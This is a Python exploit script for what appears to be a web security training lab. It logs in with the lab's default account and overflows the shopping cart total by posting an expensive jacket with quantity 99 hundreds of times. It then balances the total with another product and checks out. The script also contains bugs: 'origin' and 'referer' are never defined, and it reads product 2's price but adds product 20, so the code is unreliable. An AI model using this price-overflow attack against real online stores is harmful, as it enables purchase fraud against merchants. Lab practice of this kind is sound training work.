import requests
import math
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

url = input('please enter you lab url here: ');
parsed_url = urlparse(url)
host = parsed_url.netloc

login_url = url + '/login'
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
if soup.find("input", {"name": "csrf"}):
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    login_data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }
    login_response = session.post(login_url, login_data)

for i in session.cookies:
    if i.name == 'session':
        session_cookie = i.value
print(f"your session cookie: {session_cookie}")

target_title = 'Lightweight "l33t" Leather Jacket'

response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")

for h3 in soup.find_all('h3'):
    if target_title in h3.get_text():
        product_div = h3.find_parent('div')
        a_tag = product_div.find('a', href=True)

        product_link = a_tag['href']
        if product_link.startswith("/"):
            product_link = urljoin(url, product_link)

        print("Redirecting to:", product_link)
        product_response = requests.get(product_link)
        
        headers = {
                "Host": host,
                "Cookie": f"session={session_cookie}",
                "Content-Length": "37",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Not)A;Brand";v="8", "Chromium";v="138"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Linux"',
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": origin,
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": referer,
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i"
                }

        data = f"productId=1&redir=PRODUCT&quantity=99"
        increasing_item = urljoin(url, "/cart")
        
        for i in range(1, 325):
            response = requests.post(increasing_item, headers=headers, data=data)
                
        data = f"productId=1&redir=PRODUCT&quantity=47"
        response = requests.post(increasing_item, headers=headers, data=data)

        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")

        target_id = "2"

        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            if f"productId={target_id}" in href:
                product_link = urljoin(url, href)

        print("Redirecting to:", product_link)
        product_response = requests.get(product_link)
        response = requests.get(product_link)
        soup = BeautifulSoup(response.text, "html.parser")
        price_div = soup.find("div", id="price")

        if price_div:
            price_text = price_div.get_text(strip=True)
            price_value = float(price_text.replace("$", ""))

        number_of_req = math.ceil(1221.96/price_value)
        for i in range(number_of_req):
            data = f"productId=20&redir=PRODUCT&quantity=1"
            response = requests.post(increasing_item, headers=headers, data=data)

        headers = {
                "Host": host,
                "Cookie": f"session={session_cookie}",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Not)A;Brand";v="8", "Chromium";v="138"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Linux"',
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": origin,
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": url + "/cart",
                "Accept-Encoding": "gzip, deflate, br"
        }
        cart_url = url + '/cart'
        response = session.get(cart_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf'})['value'] 
        data = {
                "csrf": csrf_token
        }
        checkout_url = url + '/cart/checkout'
        response = session.post(checkout_url, data=data, headers=headers)
        print('[+] your lab should be solved now :)')
        break

else:
    print("something went wrong try to reenter your url.")
